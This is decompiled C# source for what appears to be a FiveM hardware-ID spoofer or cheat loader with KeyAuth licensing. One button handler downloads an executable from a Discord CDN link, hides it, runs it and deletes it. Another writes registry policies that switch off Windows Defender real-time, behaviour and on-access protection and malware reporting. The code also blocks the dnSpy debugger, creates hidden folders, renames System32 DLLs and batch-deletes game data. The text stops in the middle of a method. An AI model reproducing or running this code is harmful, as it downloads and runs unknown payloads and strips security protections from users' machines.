using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Lean.Addons;
using LeanDevelopment.Properties;
using Microsoft.Win32;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace Lean.Forms
{
	// Token: 0x02000009 RID: 9
	public partial class Main : Form
	{
		// Token: 0x06000038 RID: 56 RVA: 0x00002C6C File Offset: 0x00000E6C
		public Main()
		{
			System.Timers.Timer timer = new System.Timers.Timer(50.0);
			timer.AutoReset = true;
			timer.Elapsed += Main.MyMethod;
			timer.Start();
			this.InitializeComponent();
			this.spooferpanel.BringToFront();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00002CE3 File Offset: 0x00000EE3
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00002CED File Offset: 0x00000EED
		public static void MyMethod(object sender, ElapsedEventArgs e)
		{
			Main.DimisProtection();
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00002CF8 File Offset: 0x00000EF8
		public static void MyMethod2(object sender, ElapsedEventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("FiveM");
			bool flag = processesByName.Length == 0;
			if (!flag)
			{
				Thread.Sleep(1000);
				new Process
				{
					StartInfo = 
					{
						FileName = "cmd.exe",
						CreateNoWindow = true,
						RedirectStandardInput = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						Verb = "runas",
						Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
					}
				}.Start();
				Application.Exit();
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00002DA8 File Offset: 0x00000FA8
		private void Main_Load(object sender, EventArgs e)
		{
			this.usernameLabel.Text = Login.KeyAuthApp.user_data.username;
			this.textip.Hide();
			this.enterip.Hide();
			int num = Convert.ToInt32(Login.KeyAuthApp.app_data.numUsers);
			int num2 = 60;
			int num3 = num + num2;
			this.siticoneLabel11.Text = "Total Users: " + num.ToString();
			Main.DimisProtection();
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			bool flag = processesByName.Length == 0;
			if (flag)
			{
				string path = "C:\\Program Files\\Win64";
				bool flag2 = !Directory.Exists(path);
				if (flag2)
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				else
				{
					Directory.CreateDirectory("C:\\Program Files\\Win64");
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path);
					directoryInfo2.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				this.paketo.Show();
				this.prem1.Hide();
				this.premnew1.Hide();
				this.premnew2.Hide();
				this.prem4.Hide();
				this.prem6.Hide();
				bool flag3 = Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Developer";
				if (flag3)
				{
					this.paketo.Hide();
					this.prem1.Show();
					this.premnew1.Show();
					this.premnew2.Show();
					this.prem4.Show();
					this.prem6.Show();
				}
				else
				{
					bool flag4 = Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Premium User";
					if (flag4)
					{
						this.paketo.Hide();
						this.prem1.Show();
						this.premnew1.Show();
						this.premnew2.Show();
						this.prem4.Show();
						this.prem6.Show();
					}
				}
				this.spooferpanel.BringToFront();
				Login.KeyAuthApp.check();
				this.subscription.Text = Login.KeyAuthApp.user_data.subscriptions[0].subscription;
				this.version.Text = "Version:  " + Login.KeyAuthApp.app_data.version;
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				WebRequest webRequest = WebRequest.Create("https://pastebin.com/raw/GSXJSWtr");
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				string text = streamReader.ReadToEnd();
				WebRequest webRequest2 = WebRequest.Create("https://pastebin.com/raw/P72g9Hxd");
				WebResponse response2 = webRequest2.GetResponse();
				Stream responseStream2 = response2.GetResponseStream();
				StreamReader streamReader2 = new StreamReader(responseStream2);
				string text2 = streamReader2.ReadToEnd();
			}
			else
			{
				base.Hide();
				MessageBox.Show("Debug Attempt Detected", "Devils Woofer", MessageBoxButtons.OK);
				Application.Exit();
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000030D0 File Offset: 0x000012D0
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			return result;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000030F6 File Offset: 0x000012F6
		private void sendmsg_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000030FC File Offset: 0x000012FC
		private void timer1_Tick(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.time.Text = string.Format("{0}/{1}/{2} {3}:{4}:{5}", new object[]
			{
				now.Day,
				now.Month,
				now.Year,
				now.Hour,
				now.Minute,
				now.Second
			});
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000030F6 File Offset: 0x000012F6
		private void key_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000030F6 File Offset: 0x000012F6
		private void StartBTN_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneLabel1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000030F6 File Offset: 0x000012F6
		private void subscription_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000030F6 File Offset: 0x000012F6
		private void chatmsg_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneShadowPanel5_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000030F6 File Offset: 0x000012F6
		private void IPAddressTB_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003186 File Offset: 0x00001386
		private void siticoneGradientButton2_Click(object sender, EventArgs e)
		{
			this.spooferpanel.BringToFront();
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneGradientButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneGradientButton3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneGradientButton4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000030F6 File Offset: 0x000012F6
		private void settingspanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000030F6 File Offset: 0x000012F6
		private void settingspanel_Paint_1(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x000030F6 File Offset: 0x000012F6
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000030F6 File Offset: 0x000012F6
		private void panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000030F6 File Offset: 0x000012F6
		private void version_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000030F6 File Offset: 0x000012F6
		private void LogoutPanelButton_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003198 File Offset: 0x00001398
		private void siticoneButton1_Click_1(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Win64";
			bool flag = !Directory.Exists(path);
			if (flag)
			{
				Directory.CreateDirectory(path);
			}
			bool flag2 = File.Exists("C:\\Program Files\\Win64\\cache.exe");
			if (flag2)
			{
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/956446548160573450/cache.exe";
				string fileName = "C:\\Program Files\\Win64\\cache.exe";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Win64\\cache.exe", FileAttributes.Hidden);
				Thread.Sleep(1000);
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000030F6 File Offset: 0x000012F6
		private void MethodCB_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000030F6 File Offset: 0x000012F6
		private void DiscordRPCTS_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000030F6 File Offset: 0x000012F6
		private void DiscordRPCTS_BackColorChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003250 File Offset: 0x00001450
		public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
		{
			string str = "Ethernet";
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				bool flag = networkInterface.Id == adapterId;
				if (flag)
				{
					str = networkInterface.Name;
					break;
				}
			}
			string str2;
			if (enable)
			{
				str2 = "enable";
			}
			else
			{
				str2 = "disable";
			}
			ProcessStartInfo startInfo = new ProcessStartInfo("netsh", "interface set interface \"" + str + "\" " + str2);
			Process process = new Process();
			process.StartInfo = startInfo;
			process.Start();
			process.StartInfo.CreateNoWindow = true;
			process.WaitForExit();
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00003304 File Offset: 0x00001504
		public static string RandomMac()
		{
			string text = "ABCDEF0123456789";
			string text2 = "26AE";
			string text3 = "";
			Random random = new Random();
			text3 += text[random.Next(text.Length)].ToString();
			text3 += text2[random.Next(text2.Length)].ToString();
			for (int i = 0; i < 5; i++)
			{
				text3 += "-";
				text3 += text[random.Next(text.Length)].ToString();
				text3 += text[random.Next(text.Length)].ToString();
			}
			return text3;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00003186 File Offset: 0x00001386
		private void siticoneGradientButton2_Click_1(object sender, EventArgs e)
		{
			this.spooferpanel.BringToFront();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000033E0 File Offset: 0x000015E0
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[Main.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000342C File Offset: 0x0000162C
		private void siticoneRoundedButton9_Click(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			try
			{
				bool flag = this.MethodCB.Text == "FiveM";
				if (flag)
				{
					try
					{
						bool flag2 = File.Exists("C:\\Program Files\\Win64\\net.bat");
						if (flag2)
						{
							File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
							File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
						}
						bool flag3 = Directory.Exists("C:\\Program Files (x86)\\Blade Group");
						if (flag3)
						{
							Directory.Delete("C:\\Program Files (x86)\\Blade Group");
							Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
						}
						Class1 @class = new Class1();
						@class.spoofUserMode();
					}
					catch
					{
					}
					string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("echo off");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
